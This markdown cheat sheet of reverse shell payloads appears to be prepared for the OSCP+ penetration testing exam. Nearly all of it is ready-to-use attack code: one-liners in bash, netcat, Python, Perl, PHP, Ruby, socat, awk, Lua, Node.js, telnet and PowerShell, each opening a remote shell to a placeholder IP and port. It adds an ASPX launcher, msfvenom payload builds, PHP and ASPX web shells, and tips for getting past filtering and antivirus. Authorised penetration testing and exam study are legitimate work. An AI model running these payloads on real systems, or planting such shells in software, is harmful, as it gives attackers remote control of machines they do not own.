# Reverse Shells

## Purpose

Fast reverse shell payloads for common target environments during OSCP+.

Core rules:
- Replace `<IP>` and `<PORT>`
- Use the simplest working payload first
- Match payload to target language / OS
- If one fails, move immediately to the next

---

# 1. BASH / SH

## Bash TCP

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

## Bash alternate

```bash
/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

## sh with mkfifo

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
```

---

# 2. NETCAT

## Netcat with -e

```bash
nc -e /bin/bash <IP> <PORT>
```

## Netcat with -c

```bash
nc -c /bin/bash <IP> <PORT>
```

## BusyBox nc

```bash
busybox nc <IP> <PORT> -e /bin/sh
```

---

# 3. PYTHON

## Python 3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Python 2

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

# 4. PERL

```bash
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

# 5. PHP

## Simple exec

```php
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## system()

```php
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh <&3 >&3 2>&3");'
```

## passthru()

```php
php -r '$s=fsockopen("<IP>",<PORT>);passthru("/bin/sh <&3 >&3 2>&3");'
```

---

# 6. RUBY

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Ruby interactive shell

```bash
ruby -rsocket -e 'c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

# 7. SOCAT

## Target

```bash
socat TCP:<IP>:<PORT> EXEC:/bin/sh
```

## Better TTY

```bash
socat TCP:<IP>:<PORT> EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

---

# 8. AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c) } } while(c != "exit") close(s) }}' /dev/null
```

---

# 9. LUA

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<IP>','<PORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

---

# 10. JAVA

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

# 11. NODE.JS

```bash
node -e "var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(<PORT>,'<IP>',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"
```

---

# 12. TELNET

```bash
rm -f /tmp/p; mkfifo /tmp/p; telnet <IP> <PORT> 0</tmp/p | /bin/sh 1>/tmp/p
```

---

# 13. POWERSHELL

## Full interactive shell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Shorter PowerShell launcher

```powershell
powershell -c "$client = New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

---

# 14. CMD / WINDOWS

## Using nc.exe

```cmd
nc.exe <IP> <PORT> -e cmd.exe
```

## Using ncat.exe

```cmd
ncat.exe <IP> <PORT> -e cmd.exe
```

---

# 15. ASP / ASPX

## ASPX reverse shell launcher

```aspx
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">protected void Page_Load(object sender, EventArgs e){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";p.StartInfo.UseShellExecute=false;p.StartInfo.CreateNoWindow=true;p.Start();}</script>
```

---

# 16. MSFVENOM QUICK PAYLOADS

## Linux x64 ELF

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
```

## Linux x86 ELF

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
```

## Windows x64 EXE

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
```

## Windows x86 EXE

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
```

## Windows x64 MSI

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
```

## ASPX payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx
```

## WAR payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war
```

## PHP payload

```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php
```

---

# 17. WEB SHELLS (COMMAND EXECUTION)

## PHP

```php
<?php system($_GET['cmd']); ?>
```

## Simple PHP passthru

```php
<?php passthru($_REQUEST['cmd']); ?>
```

## ASPX command shell

```aspx
<%@ Page Language="C#" %><% Response.Write(new System.Diagnostics.Process(){StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe","/c " + Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false,CreateNoWindow=true}}.StandardOutput.ReadToEnd()); %>
```

---

# 18. QUICK CHOICE GUIDE

## Linux target
1. bash
2. python3
3. netcat
4. perl
5. php
6. socat

## Windows target
1. PowerShell
2. nc.exe / ncat.exe
3. msfvenom exe/msi
4. aspx launcher

## Web target
1. php web shell
2. php reverse shell
3. aspx reverse shell
4. war payload

---

# 19. COMMON FAILURE POINTS

- wrong IP or port
- listener not running
- outbound filtering
- target missing interpreter
- shell dies immediately
- AV deletes payload
- bad quote escaping in web contexts
- architecture mismatch for binaries

---

# 20. GOLDEN RULES

- Start with the native language already on target
- Use one-liners before uploaded binaries
- PowerShell is top-tier on Windows
- Python and Bash are top-tier on Linux
- If a payload fails, switch immediately
- Keep this file payload-only